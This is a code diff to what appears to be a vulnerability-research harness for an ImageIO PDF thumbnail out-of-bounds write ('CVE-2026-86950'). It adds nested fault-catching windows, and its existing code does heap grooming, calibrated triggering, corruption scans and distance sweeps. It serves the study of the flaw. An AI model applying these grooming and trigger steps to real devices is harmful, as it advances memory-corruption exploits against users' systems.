@@ -44,9 +44,14 @@
 #include <string.h>
 #include <pthread.h>
 
-static sigjmp_buf           g_fault_jb;
-static sigjmp_buf           g_post_jb;   // the second window: post-render phase
-static volatile sig_atomic_t g_in_probe = 0;
+// Three windows, one current pointer: the WHOLE module (so a death between the
+// steps -- the 17 Nov screenshot died mid-BUNDLE, before any other guard
+// existed -- is caught and named), one render, and the post-render scan.
+static sigjmp_buf           g_mod_jb;      // whole module
+static sigjmp_buf           g_render_jb;   // one thumbnail render
+static sigjmp_buf           g_post_jb;     // the carpet scan and its prints
+static sigjmp_buf          *g_cur_jb = NULL;  // innermost open window
+static volatile int          g_probe_depth = 0; // >0 while any window of ours is open
 static volatile sig_atomic_t g_in_fault = 0;
 static volatile uint64_t    g_probe_thread = 0;
 static volatile unsigned long g_far = 0, g_esr = 0, g_pc = 0;
@@ -56,7 +61,8 @@ static volatile unsigned long g_xreg[29];
 static void fault_handler(int sig, siginfo_t *si, void *uc) {
     (void)si;
     if (g_in_fault) _exit(70);                          // fault inside the handler
-    if (!g_in_probe || (uint64_t)(uintptr_t)pthread_self() != g_probe_thread) {
+    if (g_probe_depth <= 0 || !g_cur_jb ||
+        (uint64_t)(uintptr_t)pthread_self() != g_probe_thread) {
         signal(sig, SIG_DFL);                           // not ours: let it crash properly
         return;
     }
@@ -70,7 +76,7 @@ static void fault_handler(int sig, siginfo_t *si, void *uc) {
     }
     g_sig = sig;
     g_in_fault = 0;
-    siglongjmp(g_fault_jb, 1);
+    siglongjmp(*g_cur_jb, 1);   // jump to the innermost open window
 }
 
 static void fault_arm(void) {
@@ -118,13 +124,15 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
     CGImageRef img = NULL;
     g_sig = 0; g_far = 0; g_esr = 0; g_pc = 0;
     fault_arm();
-    g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
-    if (sigsetjmp(g_fault_jb, 1) == 0) {
-        g_in_probe = 1;
+    if (!g_probe_thread) g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
+    sigjmp_buf *saved_jb = g_cur_jb;
+    if (sigsetjmp(g_render_jb, 1) == 0) {
+        g_cur_jb = &g_render_jb;
+        g_probe_depth++;
         img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
-        g_in_probe = 0;
+        g_probe_depth--;
     } else {
-        g_in_probe = 0;
+        g_probe_depth--;
         AvePost([NSString stringWithFormat:@"%@ FAULT in render: sig=%d far=%#llx "
                  @"pc=%#llx esr=%#08llx WnR=%d (esr&0x3f=%#llx) - the write hit a "
                  @"page it may not touch; run continues", tag, g_sig,
@@ -143,9 +151,11 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
                      (unsigned long long)g_xreg[besti], besti, bestd]);
         CFRelease(opts);          // ImageIO state may be inconsistent after a fault,
         CFRelease(src);           // so do not touch anything else of its making
+        g_cur_jb = saved_jb;      // back to the enclosing window
         return [NSString stringWithFormat:@"%@: FAULT sig=%d far=%#llx (fault caught, "
                 @"carpet scan still runs)", tag, g_sig, (unsigned long long)g_far];
     }
+    g_cur_jb = saved_jb;
     CFRelease(opts);
 
     NSString *res;
@@ -208,13 +218,13 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     size_t groomSz[] = { 4032, 4288 };   // 4*(32*DX+16) for DX=31 and DX=33
     int nGroom = (int)(sizeof(groomSz) / sizeof(groomSz[0]));
     int cap = regions * (1 + nGroom);
-    // the bookkeeping lives on the STACK, not the heap: the OOB can zero heap
-    // words (it zeroed our detector fill), and a corrupted ptrs[i] would make the
-    // full scan walk a bad pointer and die mid-measurement.
+    // the bookkeeping is .bss: the OOB zeroes heap words (it zeroed our detector
+    // fill, so a corrupted heap-side ptrs[i] would make the full scan walk a bad
+    // pointer), and a dispatch worker thread is no place for 80 KB anyway.
     if (cap <= 0 || cap > 4096) return -1;
-    void *ptrs[4096];
-    size_t szl[4096];
-    int ids[4096];
+    static void *ptrs[4096];
+    static size_t szl[4096];
+    static int ids[4096];
     int n = 0, obj = 0;
     for (int r = 0; r < regions; r++) {
         void *d = malloc(4096);
@@ -247,9 +257,10 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     // partial-but-honest instead of the process dying silently.
     int corrupt = 0;      // declared outside the guard: the verdict is reported on
     int printed = 0;    // both the normal and the fault path
+    sigjmp_buf *saved_post = g_cur_jb;
     if (sigsetjmp(g_post_jb, 1) == 0) {
-        g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
-        g_in_probe = 1;
+        g_cur_jb = &g_post_jb;
+        g_probe_depth++;
     for (int i = 0; i < n; i++) {
         void *p = ptrs[i];
         size_t sz = szl[i];
@@ -286,17 +297,19 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
             }
         }
     // ptrs/szl/ids kept alive on purpose (see above): no free at all here.
-        g_in_probe = 0;
+        g_probe_depth--;
+        g_cur_jb = saved_post;
         AvePost([NSString stringWithFormat:@"86950 carpet scan: %d corrupted words (%d "
                  @"printed) over the whole carpet (%d blocks)", corrupt, printed, n]);
     } else {
-        g_in_probe = 0;
+        g_probe_depth--;
         // a fault INSIDE the scan/print phase: name it, keep the process alive
         AvePost([NSString stringWithFormat:@"86950 FAULT post-render phase: sig=%d "
                  @"far=%#llx pc=%#llx esr=%#08llx (an allocation tripped a corrupted "
                  @"zone - the metadata-corruption branch; verdict is partial)",
                  g_sig, (unsigned long long)g_far, (unsigned long long)g_pc,
                  (unsigned long long)g_esr]);
+        g_cur_jb = saved_post;
     }
     return corrupt;
 }
@@ -506,7 +519,7 @@ static void ModRepeatCalibrated(void) {
     AvePost([NSString stringWithFormat:@"86950 REPEAT: all %d renders survived", reps]);
 }
 
-NSString *ModCVE86950(void) {
+static NSString *ModCVE86950Body(void) {
     // Order that gets an answer: bundle report -> control -> groom verdict ->
     // repeat calibration -> leaf/chain/K/distance sweeps (R86950_START=<index>
     // to jump to any distance).  The groom is first because its verdict is the
@@ -514,12 +527,14 @@ NSString *ModCVE86950(void) {
     // able to kill the process before that line is flushed.
     AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
     AvePost(@"86950 start");
+    AvePost(@"86950 phase=bundle");          // the last phase= line names a dying phase
     ModReportBundle();
     // Groom verdict FIRST, before the 40-render repeat: the repeat's OOB writes
     // are what corrupt malloc metadata, and the freelist check that later kills
     // the process (observed on the CFNetwork CacheDB-write thread, 14/15 Nov)
     // could fire before a late verdict line is flushed. The groom line is the
     // run's purpose -- everything else is calibration.
+    AvePost(@"86950 phase=ctl");
     NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
     AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
     if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
@@ -536,6 +551,7 @@ NSString *ModCVE86950(void) {
     NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
     if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
         AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
+        AvePost(@"86950 phase=carpet");
         int corrupt = ModGroomScan(128, 8 << 20, cal, 32);   // reference detector count
         if (corrupt) {
             AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED in our tagged regions");
@@ -547,13 +563,54 @@ NSString *ModCVE86950(void) {
     }
     ModRepeatCalibrated();   // after the verdict, not before it
 
-    ModSweepLeaf();
-    ModSweepChain();
-    ModSweepK();
+    AvePost(@"86950 phase=sweep-leaf");  ModSweepLeaf();
+    AvePost(@"86950 phase=sweep-chain"); ModSweepChain();
+    AvePost(@"86950 phase=sweep-k");     ModSweepK();
+    AvePost(@"86950 phase=sweep-distance");
     int d = ModSweepDistance();
     if (d > 0)
         return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
                 @"distance %d bytes before the coverage buffer (R86950_START to continue)", d];
     AvePost(@"86950 verdict: no distance produced a fault");
     return @"86950: distance sweep completed without a fault";
+}
+
+// The module entry runs the body inside one more window: the 17 Nov screenshot
+// caught the process dying mid-BUNDLE -- before any render, so no existing guard
+// was armed -- and the run vanished with no on-device trace.  With this wrapper
+// a death anywhere in the module is caught, named by the last `phase=` line, and
+// reported with sig/far/pc/esr and the nearest register; the process survives so
+// the verdict (or the verdict's absence) is honest and the LOG is complete.
+NSString *ModCVE86950(void) {
+    fault_arm();
+    if (!g_probe_thread) g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
+    sigjmp_buf *saved_mod = g_cur_jb;
+    if (sigsetjmp(g_mod_jb, 1) == 0) {
+        g_cur_jb = &g_mod_jb;
+        g_probe_depth++;
+        NSString *v = ModCVE86950Body();
+        g_probe_depth--;
+        g_cur_jb = saved_mod;
+        return v;
+    }
+    g_probe_depth--;
+    AvePost([NSString stringWithFormat:@"86950 FAULT module phase: sig=%d far=%#llx "
+             @"pc=%#llx esr=%#08llx (the run died in the phase named by the last "
+             @"86950 phase= line; process kept alive)", g_sig,
+             (unsigned long long)g_far, (unsigned long long)g_pc,
+             (unsigned long long)g_esr]);
+    unsigned long bestd = ~0UL; int besti = -1;
+    for (int i = 0; i < 29; i++) {
+        unsigned long v = g_xreg[i]; if (!v) continue;
+        unsigned long dd = (v > g_far) ? (v - g_far) : (g_far - v);
+        if (dd < bestd) { bestd = dd; besti = i; }
+    }
+    if (besti >= 0)
+        AvePost([NSString stringWithFormat:@"86950 FAULT module register x%d = %#llx, "
+                 @"|far - x%d| = %#lx", besti, (unsigned long long)g_xreg[besti],
+                 besti, bestd]);
+    g_cur_jb = saved_mod;
+    return [NSString stringWithFormat:@"86950: FAULT sig=%d far=%#llx (module survived "
+            "the crash - see the phase= line above)", g_sig,
+            (unsigned long long)g_far];
 }
